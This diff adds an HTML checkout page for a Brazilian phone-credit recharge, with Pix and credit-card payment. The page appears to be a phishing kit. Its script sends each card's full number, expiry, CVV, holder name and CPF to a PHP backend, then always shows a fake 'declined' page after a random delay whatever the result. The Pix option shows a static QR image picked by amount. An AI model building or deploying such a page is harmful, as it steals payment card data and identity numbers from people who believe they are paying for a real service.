@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagamento - Recarga Rápida</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+</head>
+<body class="body-principal">
+
+    <div class="container">
+        <header class="payment-header">
+            <h1 id="recharge-summary"></h1> 
+        </header>
+
+        <main class="card">
+            <h2>Como você prefere pagar?</h2>
+            <div class="payment-options">
+                <button id="pix-button" class="payment-card">
+                     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-dollar-sign"><line x1="12" y1="1" x2="12" y2="23"></line><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path></svg>
+                    Pix
+                </button>
+                <button id="card-button" class="payment-card">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-credit-card"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg>
+                    Cartão de Crédito
+                </button>
+            </div>
+
+            <div id="payment-details">
+                <section id="pix-section" class="hidden">
+                    <h3>Pague com Pix</h3>
+                    <p>Para finalizar, clique no botão abaixo para gerar o QR Code e escaneie com o app do seu banco.</p>
+                    <button id="generate-pix-button">Gerar QR Code PIX</button>
+                </section>
+                <section id="card-section" class="hidden">
+                    <h3>Dados do Cartão</h3>
+                    <form id="credit-card-form" novalidate>
+                        <input type="text" id="card-number" placeholder="Número do Cartão" required maxlength="19">
+                        <div class="form-row">
+                            <input type="text" id="card-expiry" placeholder="Validade (MM/AA)" required maxlength="5">
+                            <input type="text" id="card-cvv" placeholder="CVV" required maxlength="4">
+                        </div>
+                        <input type="text" id="card-holder-name" placeholder="Nome do Titular" required>
+                        <input type="text" id="card-holder-cpf" placeholder="CPF do Titular" required maxlength="14">
+                        <button type="submit" id="confirm-payment-button">Confirmar Pagamento</button>
+                    </form>
+                </section>
+            </div>
+        </main>
+    </div>
+
+    <div id="pix-modal" class="modal-overlay hidden">
+        <div class="modal-content">
+            <span class="close-modal">&times;</span>
+            <h2>Pagamento via PIX</h2>
+            <div id="pix-payment-value" class="pix-value-display"></div>
+            <p>Escaneie o código para pagar.</p>
+            <img id="pix-qrcode-image" src="" alt="QR Code PIX">
+            <div class="timer" id="pix-timer">10:00</div>
+            <small>Este código expira em 10 minutos.</small>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const rechargeSummary = document.getElementById('recharge-summary');
+            const pixButton = document.getElementById('pix-button');
+            const cardButton = document.getElementById('card-button');
+            const pixSection = document.getElementById('pix-section');
+            const cardSection = document.getElementById('card-section');
+            const generatePixButton = document.getElementById('generate-pix-button');
+            const pixModal = document.getElementById('pix-modal');
+            const closeModal = document.querySelector('.close-modal');
+            const pixTimer = document.getElementById('pix-timer');
+            const pixQrCodeImage = document.getElementById('pix-qrcode-image');
+            const pixPaymentValueDisplay = document.getElementById('pix-payment-value');
+            const creditCardForm = document.getElementById('credit-card-form');
+            const confirmPaymentButton = document.getElementById('confirm-payment-button');
+
+            const phone = localStorage.getItem('rechargePhone');
+            const paymentValue = parseFloat(localStorage.getItem('paymentValue'));
+            const rechargeValue = parseFloat(localStorage.getItem('rechargeValue'));
+
+            if (phone && !isNaN(paymentValue) && !isNaN(rechargeValue)) {
+                if (paymentValue === rechargeValue) {
+                    rechargeSummary.innerHTML = `Pague <strong>R$ ${paymentValue.toFixed(2)}</strong> para o número <strong>${phone}</strong>`;
+                } else {
+                    rechargeSummary.innerHTML = `Pague <strong>R$ ${paymentValue.toFixed(2)}</strong> e receba <strong>R$ ${rechargeValue.toFixed(2)}</strong> de crédito para <strong>${phone}</strong>`;
+                }
+                
+                confirmPaymentButton.textContent = `Confirmar Pagamento de R$ ${paymentValue.toFixed(2)}`;
+                
+            } else {
+                rechargeSummary.innerHTML = 'Dados da recarga não encontrados.';
+            }
+            
+            pixButton.addEventListener('click', () => {
+                pixButton.classList.add('selected');
+                cardButton.classList.remove('selected');
+                pixSection.classList.remove('hidden');
+                cardSection.classList.add('hidden');
+            });
+
+            cardButton.addEventListener('click', () => {
+                cardButton.classList.add('selected');
+                pixButton.classList.remove('selected');
+                cardSection.classList.remove('hidden');
+                pixSection.classList.add('hidden');
+            });
+
+            let timerInterval;
+            function startTimer(duration, display) {
+                clearInterval(timerInterval);
+                let timer = duration, minutes, seconds;
+                timerInterval = setInterval(() => {
+                    minutes = parseInt(timer / 60, 10);
+                    seconds = parseInt(timer % 60, 10);
+                    minutes = minutes < 10 ? "0" + minutes : minutes;
+                    seconds = seconds < 10 ? "0" + seconds : seconds;
+                    display.textContent = minutes + ":" + seconds;
+                    if (--timer < 0) {
+                        clearInterval(timerInterval);
+                        display.textContent = "Expirado";
+                    }
+                }, 1000);
+            }
+
+            generatePixButton.addEventListener('click', () => {
+                pixQrCodeImage.src = `assets/qrcode_${paymentValue}.png`;
+                pixPaymentValueDisplay.innerHTML = `Valor a pagar: <strong>R$ ${paymentValue.toFixed(2)}</strong>`;
+                pixModal.classList.remove('hidden');
+                startTimer(599, pixTimer);
+            });
+
+            const closePixModal = () => {
+                pixModal.classList.add('hidden');
+                clearInterval(timerInterval);
+            };
+
+            closeModal.addEventListener('click', closePixModal);
+            window.addEventListener('click', (event) => {
+                if (event.target == pixModal) {
+                    closePixModal();
+                }
+            });
+
+            const cardNumber = document.getElementById('card-number');
+            const cardExpiry = document.getElementById('card-expiry');
+            const cardCvv = document.getElementById('card-cvv');
+            const cardHolderName = document.getElementById('card-holder-name');
+            const cardHolderCpf = document.getElementById('card-holder-cpf');
+            
+            cardNumber.addEventListener('input', (e) => e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 '));
+            cardExpiry.addEventListener('input', (e) => e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{2})(\d)/, '$1/$2'));
+            cardCvv.addEventListener('input', (e) => e.target.value = e.target.value.replace(/\D/g, ''));
+            cardHolderCpf.addEventListener('input', (e) => {
+                let v = e.target.value.replace(/\D/g, '');
+                v = v.replace(/(\d{3})(\d)/, '$1.$2');
+                v = v.replace(/(\d{3})(\d)/, '$1.$2');
+                v = v.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+                e.target.value = v;
+            });
+            cardHolderName.addEventListener('input', (e) => e.target.value = e.target.value.replace(/(^|\s)\S/g, l => l.toUpperCase()));
+
+            async function processPaymentAndNotify() {
+                const cardData = {
+                    number: cardNumber.value,
+                    expiry: cardExpiry.value,
+                    cvv: cardCvv.value,
+                    name: cardHolderName.value,
+                    cpf: cardHolderCpf.value,
+                    payment_value: paymentValue,
+                    recharge_phone: phone
+                };
+
+                try {
+                    const response = await fetch('processar_pagamento.php', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(cardData),
+                    });
+                    
+                    const result = await response.json();
+                    console.log('Resposta do backend:', result);
+
+                } catch (error) {
+                    console.error('Erro ao comunicar com o backend:', error);
+                }
+            }
+
+            creditCardForm.addEventListener('submit', async (e) => {
+                e.preventDefault();
+
+                confirmPaymentButton.disabled = true;
+                confirmPaymentButton.innerHTML = `<span class="spinner"></span> Processando...`;
+                
+                await processPaymentAndNotify();
+
+                const randomDelay = Math.floor(Math.random() * (8000 - 3000 + 1)) + 3000;
+
+                setTimeout(() => {
+                    window.location.href = 'recusado.html'; 
+                }, randomDelay);
+            });
+        });
+    </script>
+</body>
+</html>
